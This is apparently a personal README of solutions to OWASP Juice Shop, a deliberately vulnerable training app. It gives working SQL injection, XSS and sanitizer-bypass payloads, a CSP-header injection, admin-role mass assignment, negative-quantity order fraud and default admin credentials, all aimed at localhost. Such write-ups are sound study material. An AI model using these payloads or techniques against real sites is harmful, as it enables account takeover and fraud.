# OWASP-juice-shop-solutions
This repo holds my solutions for the OWASP Juice Shop challenges
## Prerequisite Challenges
### 1. Confidential Document
Navigate to the "About Us" page. There is a link in the middle of the paragraph that is highlighted green. Click that link and you will be redirected to `localhost:3000/ftp/legal.md`. We want to access the content in this file's parent directory. This can be easily accomplished by changing the URL to `localhost:3000/ftp`. Open the `acquisitions.md` file to complete the challenge.
### 2. Exposed Metrics
The linked documentation for prometheus mentions a directory called `/metrics` as the standard endpoint. Simply naviagte to `localhost:3000/metrics` to reveal metric information and complete the challenge.
### 3. Missing Encoding
Inspect the broken image. Find the src link: 
```
http://localhost:3000/assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg
```
Visit this link in your browser. Then, check the Network tab. It will show that the actual visited link reads: 
```
http://localhost:3000/assets/public/images/uploads/%F0%9F%98%BC-
``` 
which is everything up until the first `#` symbol. The website can render unencoded pound signs, but your browser cannot. Encode each `#` as `%23` to get the solution URL: 
```
http://localhost:3000/assets/public/images/uploads/😼-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg
```
### 4. Web3 Sandbox
Search for `sandbox` in main.js to reveal the path:
```
localhost:3000/#/web3-sandbox
```
Navigating to this URL solves the challenge.
### 5. Login Admin
For this challenge, a SQL injection attack must be used to login without the right credentials. A common approach for these problems is to enter quotes `'` to manipulate the sql query string. Enter `'` as the username and any value as the password and then click login. Inspect the Network tab to see how the client interpreted this login. You should see a line in the response like this:
```
"sql": "SELECT * FROM Users WHERE email = ''' AND password = '098f6bc*****************' AND deletedAt IS NULL"
```
This produces a sqlite compile error because there is an unexpected quote within the query. In order to login, we need the query to return at least one record. This can be accomplished by adding a clause that always evaluates to true, like: `email = '' OR TRUE`. This is close to the final solution but there is still an error with the quote formatting:
```
"sql": "SELECT * FROM Users WHERE email = '' OR TRUE' AND password = '098f6bc*****************' AND deletedAt IS NULL"
```

 this is resolved by commenting out the rest of the internal code by inputting an email as:
```
' OR TRUE--
```
Now the full query reads as:
```
"sql": "SELECT * FROM Users WHERE email = '' OR TRUE--' AND password = '098f6bc*****************' AND deletedAt IS NULL"
```
which is effectively:
```
"sql": "SELECT * FROM Users WHERE email = '' OR TRUE"
```
Since this query always return TRUE, the database will return every record. Since the application expects only one user to be returned, it will automatically take the first record from the result set. In this case it will be the admin login. The first user is often the admin because user IDs are usually incremented from 1 and admin accounts are often created first in a database.
### 6. Admin Section
Navigate to this URL:
```
http://localhost:3000/#/administration
```
### 7. Password Strength
email: `admin@juice-sh.op`
password: `admin123`

### 8. View Basket
Change the `bid` to 1 in developer tools -> Session settings. Navigate away from basket and then back to basket.
### 9. Empty User Registration
To solve this challenge you have to modify the client-side javascript. Inspect the "Register" button on the registration page. Find this element in the code:
```
<button _ngcontent-jwc-c32="" type="submit" id="registerButton" mat-raised-button="" color="primary" aria-label="Button to complete the registration" class="mat-focus-indicator mat-raised-button mat-button-base mat-primary mat-button-disabled" disabled="true"><span class="mat-button-wrapper"><i _ngcontent-jwc-c32="" class="material-icons"> person_add </i> Register </span><span matripple="" class="mat-ripple mat-button-ripple"></span><span class="mat-button-focus-overlay"></span></button>
```
Delete the portion that says `disabled="true"` then click "Register" on the UI.
### 10. Five-Star Feedback
This solution requires that you have completed number 6. Login Admin and number 7. Admin Section. Login as the admin and navigate to the admin section (`http://localhost:3000/#/administration`). Click the trash can icon next to the one five-star review.
## XSS Attacks
### 1. API Only XSS
To find potential vulnerabilities for an API XSS attack, you can search `main.js` for vulnerable functions like `bypassSecurityTrustHtml`. There are a few places in the code where this function is found. One of those places is in the Product Description:
```
trustProductDescription(e) {
 for (let o = 0; o < e.length; o++)
 e[o].description = this.sanitizer.bypassSecurityTrustHtml(e[o].description)
}
```
This tells us that we should try to replace a product description with the XSS attack payload. Then, when a user opens the product information on the UI, they will get an XSS notification.
 Determining the exact format of the payload takes some tinkering around with postman and the API. Ultimately, you will need to identify the link for a specific product, for example, the link to the Banana Juice is:
```
http://localhost:3000/api/Products/6
```
Use a `PUT` request to update the description in the format: 
```
{"description":"<iframe src=\"javascript:alert(`xss`)\">"}
```
Note that the inner quotes are escaped. After sending the request, refresh the website and the challenge will be solved. Click on the Banana Juice product to see the attack in action.
### 2. Client-side XSS Protection
Similar to the last challenge, this attack involves finding vulnerabilities for an API XSS attack. In the last problem, we found that the API uses `bypassSecurityTrustHtml` for the product description. Upon further investigation, this function is also seen for handling users emails:
```
findAllUsers() {
   this.userService.find().subscribe(e => {
       this.userDataSource = e,
       this.userDataSourceHidden = e;
       for (const o of this.userDataSource)
           o.email = this.sanitizer.bypassSecurityTrustHtml(`<span class="${this.doesUserHaveAnActiveSession(o) ? "confirmation" : "error"}">${o.email}</span>`);
       this.userDataSource = new d.by(this.userDataSource),
       this.userDataSource.paginator = this.paginatorUsers,
       this.resultsLengthUser = e.length
   }
   , e => {
       this.error = e,
       console.log(this.error)
   }
   )
}
```
Create a new account with the malicious payload as the user's email. The application sanitizes emails in the client-side but not in the backend. Therefore, the client-side XSS protection can by by-passed by submitting a POST request to http://localhost:3000/api/Users of the form:
```
{"email": "<iframe src=\"javascript:alert(`xss`)\">", "password":""}
```
Note that the inside quotes are escaped.
### 3. CSP Bypass
This challenge can be split into two main parts: loading the malicious payload into the DOM (Document Object Model) and then bypassing the CSP to allow the payload to be executed. Login as any user and navigate to the user profile page. Try loading the malicious payload into the username field. Observe that the `<script>` command is removed, followed by one letter, leaving only `lert(`xss`)</script>`. This tells us that the sanitizer can identify and remove exact html tags. However, a cleverly crafted entry can bypass this naive policy. There are a few ways to do this, here are two of them:
```
`<<script>ascript>alert(`xss`)</script>
<<a|ascript>alert(`xss`)</script>
```
In each case, the sanitizer removes what it _thinks_ to be the html tag, followed by the next character after it. In the first example that would be `<script>a` and in the second example it is `<a|a`. 
Next, we need to bypass the CSP (change it to allow inline Javascript) so the payload can be executed. Open the Network tab of the developer settings. Set your profile picture using a valid image URL and then inspect the network activity. You should see in the `profile` header that the image url is reflected as part of the CSP:
```
content-security-policy:
img-src 'self' /assets/public/images/uploads/22.jpg; script-src 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com
```
Now, try putting an invalid url into the profile picture url field -- the url must still be of an image file type, like `https://does-not-exist.jpg`. Notice that this link is still reflected in the CSP, even though it cannot set the profile picture. Therefore, we can set the url to be any image url, even one that doesn't exist. Set it to be:
```
https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com
```
Now, the whole CSP header should read:
```
content-security-policy:
img-src 'self' https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com; script-src 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com
```
The browser will only interpret the first rule (up until the `;`)
```
content-security-policy:
img-src 'self' https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com;
```
The original policy rules have been overwritten by the malicious ones. Specifically, the addition of `'unsafe-inline'` tells the browser to run any inline code that exists in the DOM. Reload the page to complete the challenge.
### 4. HTTP-Header XSS
The vulnerable page is the Last Login page. We will load the malicious payload into the Last Login IP field. First, ensure that you are logged in, then logout. Search for the `/rest/saveLoginIp` url in the network traffic. This is how the application saves the last login IP address for the next time that you login. Unfortunately, the IP address header isn't shown in the request. Figuring it out is arbitrary. Add this header to the request and then resend it:
```
True-Client-IP: <iframe src="javascript:alert(`xss`)">
```
Login again to complete the challenge.
### 5. Server-Side XSS Protection
Post a comment that bypasses a vulnerability in the library [sanitize-html version 1.4.2](https://security.snyk.io/package/npm/sanitize-html/1.4.2) (as found in package.json.bak). In particular, this version does not recursively cleanse the input. Therefore, some clever nesting of tags can bypass the library:
```
<<love this juice>iframe src="javascript:alert(`xss`)">
```
## Improper Input Validation
### 1. Admin Registration
Register as a new user and then inspect the Network traffic for `/api/Users/`. Repeat the POST request again but this time change the email slightly and add a "role" header with the value "admin":
```
{"email":"gen-admin2@juice-sh.op",
"role":"admin","password":"admin123","passwordRepeat":"admin123","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2025-02-27T06:51:33.047Z","updatedAt":"2025-02-27T06:51:33.047Z"},"securityAnswer":"admin"}
```
### 2. Deluxe Fraud
The official guide's solution is [here](https://pwning.owasp-juice.shop/companion-guide/latest/appendix/solutions.html#_obtain_a_deluxe_membership_without_paying_for_it).
### 3. Mint the Honey Pot
### 4. Payback Time
When you change the quantity of an item in your cart, the network sends a PUT request. You can't buy negative quantities through the UI, but you can do so through direct api access. Change the quantity of any item in your cart. Open the corresponding put request. Copy and resend the request with a negative `quantity` header:
```
{"quantity":-4}
```
Complete the order by checking out. As ong as your total is negative, you will complete the challenge.
### 5. Upload Size
Files are uploaded from the Complaint page. First, inspect how files are uploaded properly by submitting a file less than 100kb. I used [this random file generator from pinetools](https://pinetools.com/random-file-generator). Inspect the Network traffic. You should see a POST to `/file-upload` that contains the file contents. Generate a new file that is between 100bk-200kb. Simply replace the old file content in the POST request with the new file content. You might change the filename as well. Sending this rewuest will comlete the challenge:
```
------WebKitFormBoundaryR8YFWOnjdRb8W9EA
Content-Disposition: form-data; name="file"; filename="110kb.pdf"
Content-Type: application/pdf

h{À¡&gZÒYÎC¸RvÜ:&ÂdÜ"Ês"Iâ ÆÍæb?
Û¸OLÜºüDÜ¿6xNc3*5OdlÑòµ®%Ñ·=[%¯Z!Ó©wÏo/1"Ä®¬eV7cGâñAúÙ
§Ûd¯ÃTaëû%¬xQ"fØUµ!À0?!rÝ~æåÚÅCÀæÏ÷fÇÍP+ö{Ü}SAøf ;AXÎ!
"¿cãmcHdÊ5:ªï±*SÜ¢xÜ p#©mâë!@AËø¨ò¬^;ÇÔÀ:¬{vf%*Ç!SÜ
r¿<Mâ«p¢]iÖ0"`ÀTº9Sâ1Vï|MãHÏ·ÆÿÍflsÇ,éEÚ]ÊRã[ÉC2eÙe
&Ûà¿c/»RîÓ8üÕMØDKUÛOjKäÓeL} ß¡aí»ÝºVoÔF)Ä=oPJe=<fiD7q
àÖ"+VÉÀè ûBcfl¢¢9·èy'x
d¸Ø ØÝflJÄì©!ÜahÂwWwAÁÊó |...
```
